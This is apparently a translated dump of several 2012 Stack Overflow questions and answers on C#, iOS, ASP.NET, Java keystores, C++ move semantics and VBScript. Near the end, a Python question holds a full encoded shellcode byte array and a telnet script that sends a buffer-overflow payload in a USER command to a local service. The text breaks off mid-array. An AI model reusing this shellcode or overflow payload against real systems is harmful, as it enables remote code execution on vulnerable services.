        .Where(x => x.obj... && x.conn...) //someCondition

    queue = logs.ToList(); 
```

鉴于`set.Count()`相对较高，并行化`set`将确保工作在可用内核上合理分配。以后无需再次并行化。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-29T16:27:19.617

您可以`ConcurrentQueue<T> Class`改用`List<T>`. 请参阅[http://msdn.microsoft.com/en-us/library/dd267265.aspx](http://msdn.microsoft.com/en-us/library/dd267265.aspx)

了解更多信息。

# iphone - UITableViewCells 使用 textViewDidEndEditing 将数据写入 plist

> ID：13125591
> 
> 赞同：0
> 
> 时间：2012-10-29T16:20:40.800
> 
> 标签：iphone, objective-c, ios, xcode

在 Cell.mi 中编写了这段代码来将一些字符串添加到字典中：

```
- (void)textViewDidEndEditing:(UITextView *)textView {

if (cellIndex == 0) {
[[dataSource objectAtIndex:dataIndex] setObject:self.cellTextView.text forKey:@"Usersmell"];
}
if (cellIndex == 1) {
    [[dataSource objectAtIndex:dataIndex] setObject:self.cellTextView.text forKey:@"Usertaste"];
}
if (cellIndex == 2) {
    [[dataSource objectAtIndex:dataIndex] setObject:self.cellTextView.text forKey:@"Usersuits"];
}
if (cellIndex == 3) {
    [[dataSource objectAtIndex:dataIndex] setObject:self.cellTextView.text forKey:@"Usernotes"];
}

NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
NSString *documentsDirectory = [paths objectAtIndex:0];
NSString *path = [documentsDirectory stringByAppendingPathComponent:@"Objects.plist"];

//removed some code here that gets the index of dictionary for replacement, then:

[allObjectsArray replaceObjectAtIndex:index withObject:[NSDictionary dictionaryWithDictionary:[dataSource objectAtIndex:dataIndex]]];
[allObjectsArray writeToFile:path atomically:YES];
} 
```

然后，在 TableViewController.m 中：

```
-(IBAction)doneButtonPressed:(id)sender {
[self.navigationController popViewControllerAnimated:YES];
} 
```

用户现在返回到 DetailViewController，其中包含有关对象的信息以及用户添加的新信息。该信息是从 viewWillAppear 中的 plist 中提取的。

但问题是，如果用户在没有先关闭键盘的情况下点击“完成”按钮（触发 textViewDidEndEditing），**则最后编辑的单元格**中的文本不会显示在 DetailViewController 中。

但是如果用户再退一步然后重新输入对象（DetailViewController），文本就在那里。所以 textViewDidEndEditing 被触发太晚，以至于父视图中的 viewWillAppear 在点击完成按钮时抓取文本。

如何解决这个问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-29T16:28:24.877

在处理“完成”按钮的方法中，`[self.view endEditing:YES]`作为方法的第一行调用。这将导致键盘关闭，允许您在屏幕关闭之前处理数据。

```
-(IBAction)doneButtonPressed:(id)sender {
    [self.view endEditing:YES];

    [self.navigationController popViewControllerAnimated:YES];
} 
```

# jquery - 高级表单验证 - 推荐的验证点

> ID：13125608
> 
> 赞同：1
> 
> 时间：2012-10-29T16:21:33.693
> 
> 标签：jquery, asp.net-mvc-3, validation

我刚刚完成了一个使用 ASP.net MVC3 的在线表格，不显眼。我对表单字段进行了所有标准验证，例如必填字段、日期格式等。现在我想知道是否应该做任何推荐的“高级”验证来防止 SQL 注入等。例如，我有几个文本区域，对它们的唯一验证是它们是必需的。

请让我知道您的建议，或者更好的是，提供带有表单验证建议的参考链接。

编辑：我不是在寻找关于如何进行验证的教程，只是在寻找关于验证内容的建议。例如，我有用于姓名和日期的文本框，用于大型评论的文本区域等。所有基本验证都已完成并且运行良好。我想我现在主要关心的是防范 SQL 注入。我将为此研究 reg ex 验证。谢谢你。

感谢您的阅读。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-29T19:35:54.590

前端并不重要，它是后端数据访问策略。

那么 - 你是如何进行数据访问的？如果您使用的是参数化查询或 ORM（实体框架）并且没有内联 sql，则无需担心，db 驱动程序会进行适当的转义。

如果其他系统将使用您存储的数据并且他们可能正在执行内联 sql（非参数化查询），那么您将需要正则表达式您的代码以确保 1\. 数字意味着数字 2\. 文本仅是字母数字 3。如果使用存储过程，那么您需要确保存储过程中的代码不会受到 sp_executesql 注入的影响。尽管请注意您是否*绝对*需要服务器端的动态 sql，但 sp_executesql 确实支持参数化查询，而不是将所有字符串连接在一起。

作为旁注，因为我觉得这里需要提及，请注意像 www.whatever.com/order/1 这样的场景通常更容易受到参数篡改（不是 sql 注入）的影响，您的查询没有正确限制当前用户访问他们无权访问的订单，因此通常检查您的查询以确保用户可以访问他们请求的内容。从 Order 中选择 ShipDate where OrderId=@orderId where CustomerId=@customerId 其中 customerId 仅存储在服务器端并且是您的安全/配置文件系统的一部分。

如果您想更深入地了解如何对您的 asp.net 网络表单和 mvc 应用程序进行 hack 校对，我在pluralsight.com 上有一个五小时的课程

[http://pluralsight.com/training/courses/TableOfContents?courseName=hack-proofing-dotnet-app&highlight=adam-tuliper_information-leakage#information-leakage](http://pluralsight.com/training/courses/TableOfContents?courseName=hack-proofing-dotnet-app&highlight=adam-tuliper_information-leakage#information-leakage)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-29T16:29:18.963

对于更严格的验证，我建议在必填字段之外使用正则表达式。基本概述的链接在[这里](http://www.asp.net/mvc/tutorials/older-versions/javascript/creating-a-mvc-3-application-with-razor-and-unobtrusive-javascript)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-29T16:33:57.337

您想创建自己的自定义验证属性，然后将它们注册到不显眼的 JavaScript 验证引擎中。这利用了`IClientValidate`接口。

这是一个关于生成您自己的自定义`IClientValidate`属性并在不显眼的 javascript 等中注册它的教程。

[http://odetocode.com/Blogs/scott/archive/2011/02/21/custom-data-annotation-validator-part-i-server-code.aspx](http://odetocode.com/Blogs/scott/archive/2011/02/21/custom-data-annotation-validator-part-i-server-code.aspx)

[http://odetocode.com/Blogs/scott/archive/2011/02/22/custom-data-annotation-validator-part-ii-client-code.aspx](http://odetocode.com/Blogs/scott/archive/2011/02/22/custom-data-annotation-validator-part-ii-client-code.aspx)

这里还有一个我已经完成并在此处发布的用于验证列表的示例：

[不显眼的收集验证](https://stackoverflow.com/questions/12266793/unobtrusive-validation-of-collection)

# java - 带有 BouncyCastleProvider 的 KeyStore：KeyStore 完整性检查失败

> ID：13125609
> 
> 赞同：15
> 
> 时间：2012-10-29T16:21:38.210
> 
> 标签：java, ssl, bouncycastle, keystore

我想为 ssl 连接使用自签名签名。我正在关注[这个](https://stackoverflow.com/a/10026598/1598840)帖子。

我的问题：创建密钥库后，我的完整性检查失败。

```
Keytool-Error: java.io.IOException: KeyStore integrity check failed. 
```

我仍在寻找，但也许有人可以为我节省一些时间。

* * *

## 回答 #1

> 赞同：33
> 
> 时间：2012-12-06T05:22:00.517

确保您使用正确的密码来打开密钥库。我遇到了这个错误，结果我仍在使用示例代码中的密码`trusted.load()`

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2012-12-05T16:07:38.693

我在尝试打开`KeyStore`本地保存的文件时遇到了同样的问题，我想到了两个原因：

*   您正在存储`KeyStore`并使用不同的密码加载它。
*   您的`KeyStore`文件已损坏，因此标记了完整性检查。

我建议您尝试使用相同的密码（固定）保存并加载另一个文件，看看它是否会正常加载。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2018-03-06T11:30:34.337

我发现了另一个可以引发此消息的极端案例。

我导出了一个 PKCS12 密钥库，`openssl`然后尝试将其导入到现有的密钥库中`keytool`。尽管在列出 PKCS12 密钥库的内容时密码正确，但在此步骤中仍收到“完整性检查失败”错误。

问题原来是因为我使用的密码长度正好是 50 个字符。尽管这被 接受`openssl`，但我知道这是使用的缓冲区的最大大小，并且密码的最后一个字符会被“字符串结尾”字符覆盖。

使用只有 49 个字符的密码再次导出 PKCS12 密钥库解决了我的问题。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2017-02-20T12:36:40.410

确保您的密钥库文件已正确关闭，`FileOutputStream.close()`否则将被标记为失去完整性

# java - Struts ActionServlet 中的静态构建器类线程是否安全？

> ID：13125615
> 
> 赞同：1
> 
> 时间：2012-10-29T16:21:55.450
> 
> 标签：java, design-patterns, struts

我在很多地方都看到过推荐的构建器模式，但不确定使用 Struts 的 Web 应用程序中的线程安全性。

我不清楚`build`静态方法的变量是由调用构建器代码的每个线程共享还是在其内部。我有一种预感，这没关系，但我想确保构建器代码存在于 Web 应用程序中，并且可以同时被 10 个线程调用。

```
public static class ExampleBuilder {

    public static Thing build(ActionForm form) {
        String property1 = form.property1;
        String property2 = form.property2;
        String propertyX = form.propertyX;
        ...

        return new Thing(property1, ...);
    }
}

public class ExampleStrutsAction extends Action {

    public ActionForward execute(ActionMapping mapping, ActionForm form, HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {
        Thing example = ExampleBuilder.build(form)
        return mapping.findForward("success");
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-29T16:42:17.807

上述`build()`方法只使用局部变量，不访问线程间共享的任何状态，因此是线程安全的。局部变量对于每个方法调用都是局部的，因此不在线程之间共享。

您可能遇到的唯一线程安全问题是表单是否具有范围`session`（这是一种不好的做法）。在这种情况下，两个线程可以使用相同的 ActionForm 实例。但这并不是`build()`方法的真正问题。而是设计问题，或`execute()`使用此会话范围的 ActionForm 的方法的同步问题。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-29T16:42:48.473

在您所做的代码修改之后，我可以说您的代码无论如何都是线程安全的，因为您没有在`build()`方法中使用任何成员变量。您可以从多个线程同时调用 as `build()`，每个线程将使用自己的方法级变量。

顺便说一句，将此类设为静态在这里没有任何意义。类上下文中的静态修饰符仅与内部类相关。内部静态类无权访问外部类的实例。顶级类根本没有外部类，因此无论如何它都无法访问其实例。

# google-chrome-extension - 从扩展选项页面链接到 chrome://chrome/extensions

> ID：13125616
> 
> 赞同：11
> 
> 时间：2012-10-29T16:21:55.543
> 
> 标签：google-chrome-extension

我正在使用 chrome 引导样式（请参阅[http://roykolak.github.com/chrome-bootstrap/](http://roykolak.github.com/chrome-bootstrap/)）来构建我的选项页面。现在我想在左侧边栏菜单中有一个指向 chrome://chrome/extensions 的链接，但是单击它会在控制台中返回错误：`Not allowed to load local resource: chrome://chrome/extensions`

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-10-29T16:38:12.127

你可以用 来打开这个`chrome.tabs.update`，[你不需要这个的 tabs 权限](https://developer.chrome.com/extensions/tabs.html#manifest)。

**选项.html**

```
<script src="options.js"></script>
<a href="#" id="test">test</a> 
```

**选项.js**

```
document.addEventListener('DOMContentLoaded', function() {
    document.getElementById('test').addEventListener('click', function() {
        chrome.tabs.update({ url: 'chrome://chrome/extensions' });
    });
}); 
```

# wordpress - 如何根据用户的位置使网站以某种语言自动打开？

> ID：13125617
> 
> 赞同：2
> 
> 时间：2012-10-29T16:21:57.250
> 
> 标签：wordpress, redirect, internationalization

我有一个多语言网站，我正试图弄清楚如何根据用户的位置以某种语言自动打开它......有人可以让我参考描述这个的文章或网站吗？

PS我正在使用WordPress

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-30T12:57:22.730

首先，您需要一个如上所述的 WP 插件。WP 默认不支持多语言网站。自动显示正确的语言并没有错，只要您可以选择让用户更改语言。

专业版应该有语言检测，但不确定它是否可用： [https ://github.com/inpsyde/multilingual-press](https://github.com/inpsyde/multilingual-press)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-29T18:08:14.597

您可能想查看多语言切换器插件[http://wordpress.org/extend/plugins/multisite-language-switcher/](http://wordpress.org/extend/plugins/multisite-language-switcher/)

# c# - 在数据绑定之前编辑对象数据源的列

> ID：13125618
> 
> 赞同：0
> 
> 时间：2012-10-29T16:21:58.513
> 
> 标签：c#, asp.net, sql, gridview, objectdatasource

目前我正在使用带有 objectdatasource 的 gridview 来显示产品信息表。我还有一个下拉列表可以在英制和公制单位之间切换视图。要在两者之间切换，每次有人更改下拉列表选择时，我都会删除旧的单位列并根据选择插入一个新列，如下所示：

```
if (GridView1.Columns.Count > 7)
     JobListGridView.Columns.Remove(GridView1.Columns[7]);

BoundField colIndex8 = new BoundField();
colIndex8.HeaderText = "Units";

if (UnitsDropDown.Text == "Imperial")
{
     colIndex8.DataField = "IUnits";
     colIndex8.SortExpression = "IUnits";
     GridView1.Columns.Add(colIndex8);
}
else
{
     colIndex8.DataField = "MUnits";
     colIndex8.SortExpression = "MUnits";
     GridView1.Columns.Add(colIndex8);
}
GridView1.DataBind(); 
```

这可以改变单位列中显示的单位（例如从“mm”到“ft”）。但是，我还需要更改显示长度的另一列的值。是否可以以某种方式编辑长度列中的值（例如乘以常数），然后将修改后的列数据绑定到gridview，而不必在数据库表中创建一个新列来存储这些信息？

我在想像：

```
DataColumn dc = GridView1.Columns[4];
foreach (cell c in dc)
{
    c *= 0.5;
}
GridView1.Columns.Add(dc);
GridView1.DataBind(); 
```

作为简单的伪代码，但这是正确的方法/这可能吗？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-29T16:31:25.273

不要添加和删除列。只需隐藏您不想看到的列：

```
<asp:BoundField DataField="IUnits" Visible="<%# UnitsDropDown.Text == "Imperial" %>" />
<asp:BoundField DataField="MUnits" Visible="<%# UnitsDropDown.Text != "Imperial" %>" /> 
```

至于您的第二个问题，请使用 TemplateField：

```
<asp:TemplateField HeaderText="foo">
    <ItemTemplate>
        <asp:Label runat="server" Text='<%# ((int)Eval("foo")) * (UnitsDropDown.Text == "Imperial" ? 0.5 : 1) %>' />
    </ItemTemplate>
</asp:TemplateField> 
```

# android - 如果从非 Activity 类调用 setDisplayHomeAsUpEnabled(true) 不显示箭头

> ID：13125625
> 
> 赞同：3
> 
> 时间：2012-10-29T16:22:03.037
> 
> 标签：android, android-actionbar

在我的活动中，我想在 ActionBar 图标左侧显示箭头，所以在活动中我写：

```
ActionBar actionBar = getActionBar();
actionBar.setDisplayHomeAsUpEnabled(true); 
```

它工作正常，但我决定将`ActionBar`初始化移动到另一个类并将其用于我的应用程序中的所有活动，为此新类：

```
 public class Utils {
    public static void initActionBar(Activity activity, boolean homeIconNeeded) {
        ActionBar actionBar = activity.getActionBar();
        actionBar.setIcon(R.drawable.logo);
        actionBar.setHomeButtonEnabled(homeIconNeeded);
        actionBar.setBackgroundDrawable(activity.getResources().getDrawable(R.drawable.action_bar_background));
    }

    public static void initActionBar(ActionBar actionBar, boolean homeIconNeeded) {
        actionBar.setIcon(R.drawable.logo);
        actionBar.setHomeButtonEnabled(true);
        actionBar.setBackgroundDrawable(SmartVmsApplication.getContext().getResources().getDrawable(R.drawable.action_bar_background));
    }
} 
```

然后在我的活动中插入`onCreate()`回调`initActionBar(this, true)`，但是**箭头没有出现**，无论我传递`Activity`还是`ActionBar`作为参数，这是一个问题。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-29T16:48:41.280

您忘记调用该`setDisplayHomeAsUpEnabled()`方法。

# c++ - 何时调用移动构造函数？

> ID：13125632
> 
> 赞同：31
> 
> 时间：2012-10-29T16:22:52.127
> 
> 标签：c++, c++11, move-constructor

我对何时调用移动构造函数和复制构造函数感到困惑。我已阅读以下资料：

[在 C++0x 中未调用移动构造函数](https://stackoverflow.com/questions/7645985/move-constructor-is-not-getting-called-in-c0x)

[在 C++11 中移动语义和右值引用](http://www.cprogramming.com/c++11/rvalue-references-and-move-semantics-in-c++11.html)

[微软](http://msdn.microsoft.com/en-us/library/dd293665.aspx)

所有这些来源要么过于复杂（我只想要一个简单的例子），要么只展示如何编写移动构造函数，而不是如何调用它。我写了一个更具体的简单问题：

```
const class noConstruct{}NoConstruct;
class a
{
private:
    int *Array;
public:
    a();
    a(noConstruct);
    a(const a&);
    a& operator=(const a&);
    a(a&&);
    a& operator=(a&&);
    ~a();
};

a::a()
{
    Array=new int[5]{1,2,3,4,5};
}
a::a(noConstruct Parameter)
{
    Array=nullptr;
}
a::a(const a& Old): Array(Old.Array)
{

}
a& a::operator=(const a&Old)
{
    delete[] Array;
    Array=new int[5];
    for (int i=0;i!=5;i++)
    {
        Array[i]=Old.Array[i];
    }
    return *this;
}
a::a(a&&Old)
{
    Array=Old.Array;
    Old.Array=nullptr;
}
a& a::operator=(a&&Old)
{
    Array=Old.Array;
    Old.Array=nullptr;
    return *this;
}
a::~a()
{
    delete[] Array;
}

int main()
{
    a A(NoConstruct),B(NoConstruct),C;
    A=C;
    B=C;
} 
```

目前 A、B 和 C 都有不同的指针值。我希望 A 有一个新指针，B 有 C 的旧指针，C 有一个空指针。

有点离题，但如果有人可以建议我可以详细了解这些新功能的文档，我将不胜感激，并且可能不需要问更多问题。

* * *

## 回答 #1

> 赞同：45
> 
> 时间：2012-10-29T16:36:14.047

调用移动构造函数：

*   当一个对象初始化器是`std::move(something)`
*   当对象初始化器是`std::forward<T>(something)`或`T`不是左值引用类型时（在模板编程中用于“完美转发”）
*   当对象初始化器是临时的并且编译器没有完全消除复制/移动时
*   当按值返回函数局部类对象并且编译器不会完全消除复制/移动时
*   当抛出一个函数局部类对象并且编译器没有完全消除复制/移动时

这不是一个完整的列表。请注意，如果参数具有类类型（不是引用），则“对象初始值设定项”可以是函数参数。

```
a RetByValue() {
    a obj;
    return obj; // Might call move ctor, or no ctor.
}

void TakeByValue(a);

int main() {
    a a1;
    a a2 = a1; // copy ctor
    a a3 = std::move(a1); // move ctor

    TakeByValue(std::move(a2)); // Might call move ctor, or no ctor.

    a a4 = RetByValue(); // Might call move ctor, or no ctor.

    a1 = RetByValue(); // Calls move assignment, a::operator=(a&&)
} 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-10-29T16:35:41.720

首先，您的复制构造函数已损坏。复制的对象和复制的对象都将指向同一个对象，并且当它们超出范围时`Array`都会尝试指向它，从而导致未定义的行为。`delete[]`要修复它，请复制数组。

```
a::a(const a& Old): Array(new int[5])
{
  for( size_t i = 0; i < 5; ++i ) {
    Array[i] = Old.Array[i];
  }
} 
```

现在，移动赋值并没有按照您的意愿执行，因为两个赋值语句都是从左值进行赋值，而不是使用右值。对于要执行的移动，您必须从右值移动，或者它必须是可以将左值视为右值的上下文（例如函数的返回语句）。

要获得所需的效果，请使用[`std::move`](http://en.cppreference.com/w/cpp/utility/move)创建右值引用。

```
A=C;              // A will now contain a copy of C
B=std::move(C);   // Calls the move assignment operator 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-12-20T08:53:42.017

请记住，可能会发生复制省略。如果您通过将`-fno-elide-constructors`标志传递给编译器来禁用它，您的构造函数可能会被执行。

你可以在这里阅读：[https ://www.geeksforgeeks.org/copy-elision-in-c/](https://www.geeksforgeeks.org/copy-elision-in-c/)

# opengl - 纹理导致其他一切都变暗

> ID：13125635
> 
> 赞同：-1
> 
> 时间：2012-10-29T16:22:57.313
> 
> 标签：opengl, textures

我正在开发一个程序，该程序可以根据您的位置和一天中的时间绘制出天空中的星星。绘制出星星后，绘制星座线，然后绘制星座图。

我用来放置图片的方法是创建一个矩形，然后将星座纹理应用到它上面。我遇到的问题是，当我应用纹理时，程序中的其他所有内容都变得非常暗，暗到我几乎看不到它的程度。

我以某种方式将其缩小到 glTexParameteri ，但我仍然不知道如何修复它。

我的目标是在屏幕上显示纹理，而不会使周围的其他一切变暗。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-29T16:40:13.483

使用 glDisable(GL_TEXTURE_…); 禁用纹理。如果不这样做，最后使用的纹理坐标和纹理将应用于以下图元。

# c++ - 同一个集合上的两个不同的迭代器是否相等

> ID：13125645
> 
> 赞同：2
> 
> 时间：2012-10-29T16:23:18.740
> 
> 标签：c++, stl, iterator

假设我使用嵌套的 for 来比较同一列表中的对象：

```
for( list<Object>::iterator iter = list.begin() ; iter != list.end() ; ++iter )
  {
    for( list<Object>::iterator iter2 = list.begin() ; iter2 != list.end() ; ++iter2 )
    {
      if( iter == iter2 )
      {
        // does this mean iter is pointing to the same INDEX
        // as iter2?  Will this work as expected?
      }
    }
  } 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-29T16:24:42.090

> ...比较同一列表中的对象：

是的，这正是您所期望的，并且工作正常。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-29T17:36:10.827

### 简短的回答：**不**。

### 中等答案：

std:: 中的普通容器提供了可以直接比较的迭代器。但是您不能对其他容器类型做出这种一般假设。

### 长答案：

这完全取决于容器的类型，以及该容器返回的迭代器的类型。如果您在谈论标准（std::) 中的容器，那么是的。但不要假设这适用于所有类型的迭代器。请记住，在 C++ 中，传递迭代器而不是对容器的引用更为常见。

```
template<typename I>
I doStuff(I begin, I end)
{
      typedef tyepename std::interator_traits<I>::iterator_category   iterator_category;

      I   alternative = begin;

      assert(alternative == begin);   // Will always be true

      ++begin;
      ++alternative;

      assert(alternative == begin);  // Will depend on the type of iterator.
      return end;
}

// Alternative using container
template<typename C>
void doStuff(C& cont)
{
      typedef tyepename std::interator_traits<typename C::iterator>::iterator_category   iterator_category;

      I   begin       = cont.begin();
      I   alternative = cont.begin();

      assert(alternative == begin);   // Will always be true

      ++begin;
      ++alternative;

      assert(alternative == begin);  // Will depend on the type of iterator.
} 
```

`Input`并且`output`迭代器**不能**像那样直接比较。

但是`Bi-Directional`和`Random Access`迭代器**是**直接可比的。

见：[http ://www.sgi.com/tech/stl/iterator_category.html](http://www.sgi.com/tech/stl/iterator_category.html)

注意：end() 返回的迭代器总是可以直接比较的，并且在容器末尾之后返回 true。但这可能不适用于其他迭代器。

# objective-c - Objective-C 中的 Box 自定义结构

> ID：13125646
> 
> 赞同：6
> 
> 时间：2012-10-29T16:23:19.340
> 
> 标签：objective-c, struct, objective-c-literals

> **可能重复：**
> [如何将 Struct 包装到 NSObject](https://stackoverflow.com/questions/5691881/how-to-wrap-a-struct-into-nsobject)
> [新的 Clang Objective-C 文字可以重定向到自定义类吗？](https://stackoverflow.com/questions/11252392/can-the-new-clang-objective-c-literals-be-redirected-to-custom-classes)

我有一个自定义结构：

```
typedef struct {
    float f1;
    float f2;
} MYCustomStruct; 
```

我需要添加到`NSArray`. 我已经编写了一个类别来创建`NSValues`这些结构，然后将其添加到 中`NSArray`，但是如果可能的话，我想进一步使用盒装表达式来简化它。我很想能够做到这一点：

```
@[@(instanceOfMYCustomStruct)]; 
```

但是，我遇到以下错误：

> 盒装表达式中使用了非法类型“MYCustomStruct”

有没有办法将盒装表达式与自定义结构一起使用？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-29T16:30:30.563

我会使用 a[`NSValue`](https://developer.apple.com/DOCUMENTATION/Cocoa/Reference/Foundation/Classes/NSValue_Class/Reference/Reference.html)来装箱一个结构，因为它内置了对它的支持。不幸的是，你不能使用objective-c 的酷文字，但是：

```
struct foo myStruct;
NSValue *val = [NSValue valueWithBytes:&myStruct objCType:@encode(typeof(myStruct))];

// to pull it out...
struct foo myStruct;
[val getValue:&myStruct]; 
```

虽然这在其他 objc 代码中可能很笨拙且丑陋，但您必须问自己 - 为什么`struct`首先在 Objective-C 中使用 a ？使用带有几个`@property`（s）的对象几乎没有速度性能，我能看到的唯一真正原因是您是否正在与 C 库集成以与内存布局兼容，即便如此，objective-c 的结构对象的内存布局是明确定义的，只要超类不改变。

那么*，您对 struct 进行装箱的真正目的是*什么？如果我们有，我们可以为您提供进一步的帮助。

# function - 调用存储在字符串变量中的函数名？

> ID：13125649
> 
> 赞同：2
> 
> 时间：2012-10-29T16:23:25.587
> 
> 标签：function, vbscript

我正在使用 VBScript，我想知道是否有任何方法可以调用存储在字符串变量中的函数名？

这是我的尝试？

```
a = "b"

sub b() 
    msgbox "c"
end sub

a() 
```

但它总是导致错误

> 类型不匹配'a'

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-10-29T18:33:08.500

正确答案是：使用 GetRef() 如下：

```
Function F(p)
  F = p + p
End Function

Dim FP : Set FP = GetRef("F")

WScript.Echo FP("a")
WScript.Echo FP(123) 
```

输出：

```
aa
246 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-10-29T16:31:52.357

似乎例如这应该工作：

```
Dim a
a = "Call b()"
Eval(a)

Sub b
   ' Do stuff
End Sub 
```

* * *

## 回答 #3

> 赞同：-3
> 
> 时间：2015-05-04T13:30:16.923

```
Dim x

Sub b

 print "xxx"' Do stuff
End Sub

x = "call b()"

Execute(eval("x")) 
```

# python - 我在我的 python 中使用了一些 shellcode 但失败了

> ID：13125651
> 
> 赞同：0
> 
> 时间：2012-10-29T16:23:30.513
> 
> 标签：python, string, bytearray

Python 版本是 2.7.3。

代码是这样的……完整的代码在[这里](https://gist.github.com/3977494)

[https://gist.github.com/3977494](https://gist.github.com/3977494)

```
shellcode = bytearray(
        "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x49\x49\x49\x49"
        "\x49\x49\x49\x49\x48\x49\x49\x49\x49\x49\x49\x49\x51\x5a\x6a\x6a"
        "\x58\x50\x30\x42\x31\x41\x42\x6b\x42\x41\x7a\x32\x42\x42\x42\x32"
        "\x41\x41\x30\x41\x41\x58\x38\x42\x42\x50\x75\x4d\x39\x69\x6c\x6b"
        "\x58\x53\x74\x77\x70\x67\x70\x73\x30\x6e\x6b\x61\x55\x57\x4c\x4e"
        "\x6b\x51\x6c\x45\x55\x32\x58\x66\x61\x58\x6f\x6e\x6b\x50\x4f\x56"
        "\x78\x4e\x6b\x41\x4f\x65\x70\x33\x31\x4a\x4b\x63\x79\x6e\x6b\x65"
        "\x64\x4c\x4b\x57\x71\x7a\x4e\x37\x41\x4b\x70\x4e\x79\x6c\x6c\x4f"
        "\x74\x4f\x30\x70\x74\x37\x77\x6f\x31\x79\x5a\x46\x6d\x67\x71\x4b"
        "\x72\x5a\x4b\x38\x74\x65\x6b\x41\x44\x47\x54\x43\x34\x52\x55\x68"
        "\x65\x4e\x6b\x33\x6f\x34\x64\x37\x71\x4a\x4b\x72\x46\x6c\x4b\x64"
        "\x4c\x50\x4b\x6c\x4b\x51\x4f\x35\x4c\x63\x31\x68\x6b\x4c\x4b\x35"
        "\x4c\x4c\x4b\x45\x51\x7a\x4b\x6c\x49\x73\x6c\x56\x44\x65\x54\x5a"
        "\x63\x50\x31\x69\x50\x61\x74\x6c\x4b\x67\x30\x64\x70\x6b\x35\x4f"
        "\x30\x72\x58\x34\x4c\x4c\x4b\x71\x50\x44\x4c\x4c\x4b\x72\x50\x55"
        "\x4c\x4c\x6d\x4e\x6b\x73\x58\x53\x38\x68\x6b\x36\x69\x4e\x6b\x6b"
        "\x30\x78\x30\x55\x50\x75\x50\x55\x50\x6c\x4b\x52\x48\x57\x4c\x41"
        "\x4f\x47\x41\x4a\x56\x71\x70\x76\x36\x6d\x59\x69\x68\x4d\x53\x6b"
        "\x70\x33\x4b\x52\x70\x30\x68\x68\x70\x6d\x5a\x74\x44\x33\x6f\x70"
        "\x68\x6d\x48\x6b\x4e\x6f\x7a\x64\x4e\x41\x47\x4b\x4f\x4b\x57\x42"
        "\x43\x70\x6d\x63\x54\x36\x4e\x71\x75\x61\x68\x30\x65\x65\x70\x64"
        "\x6f\x31\x73\x71\x30\x62\x4e\x42\x45\x52\x54\x61\x30\x53\x45\x71"
        "\x63\x75\x35\x30\x72\x37\x50\x72\x48\x50\x61\x62\x43\x52\x4b\x41"
        "\x30\x75\x38\x43\x51\x45\x33\x70\x6b\x45\x70\x54\x6f\x72\x61\x42"
        "\x64\x61\x54\x71\x30\x46\x46\x55\x76\x41\x30\x30\x6e\x61\x75\x71"
        "\x64\x41\x30\x32\x4c\x52\x4f\x41\x73\x73\x51\x52\x4c\x43\x57\x54"
        "\x32\x52\x4f\x62\x55\x44\x30\x67\x50\x53\x71\x33\x54\x62\x4d\x61"
        "\x79\x42\x4e\x42\x49\x51\x63\x62\x54\x32\x52\x70\x61\x74\x34\x42"
        "\x4f\x61\x62\x31\x63\x31\x30\x61\x78\x33\x51\x31\x73\x50\x6b\x65"
        "\x70\x46\x4f\x63\x71\x61\x54\x61\x54\x63\x30\x6a"
        )

tn = telnetlib.Telnet('127.0.0.1', 11000) 
user_string = "USER " + fill + eip_address + fill2 + shellcode + '\n' 
tn.write(user_string) 
pass_string = "PASS 123\n" 
tn.write(pass_string) 
```

我的朋友在 c 中使用相同的字符串，一切正常。当我检查ollyDbg时，我发现命令不同，似乎python改变了编码类型。我不知道...有什么帮助吗？这让我疯狂。

```
unsigned char shellcode[] = 
        "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x49\x49\x49\x49"
        "\x49\x49\x49\x49\x48\x49\x49\x49\x49\x49\x49\x49\x51\x5a\x6a\x6a"
        "\x58\x50\x30\x42\x31\x41\x42\x6b\x42\x41\x7a\x32\x42\x42\x42\x32"
        "\x41\x41\x30\x41\x41\x58\x38\x42\x42\x50\x75\x4d\x39\x69\x6c\x6b"
        "\x58\x53\x74\x77\x70\x67\x70\x73\x30\x6e\x6b\x61\x55\x57\x4c\x4e"
        "\x6b\x51\x6c\x45\x55\x32\x58\x66\x61\x58\x6f\x6e\x6b\x50\x4f\x56"
        "\x78\x4e\x6b\x41\x4f\x65\x70\x33\x31\x4a\x4b\x63\x79\x6e\x6b\x65"
        "\x64\x4c\x4b\x57\x71\x7a\x4e\x37\x41\x4b\x70\x4e\x79\x6c\x6c\x4f"
        "\x74\x4f\x30\x70\x74\x37\x77\x6f\x31\x79\x5a\x46\x6d\x67\x71\x4b"
        "\x72\x5a\x4b\x38\x74\x65\x6b\x41\x44\x47\x54\x43\x34\x52\x55\x68"
        "\x65\x4e\x6b\x33\x6f\x34\x64\x37\x71\x4a\x4b\x72\x46\x6c\x4b\x64"
        "\x4c\x50\x4b\x6c\x4b\x51\x4f\x35\x4c\x63\x31\x68\x6b\x4c\x4b\x35"
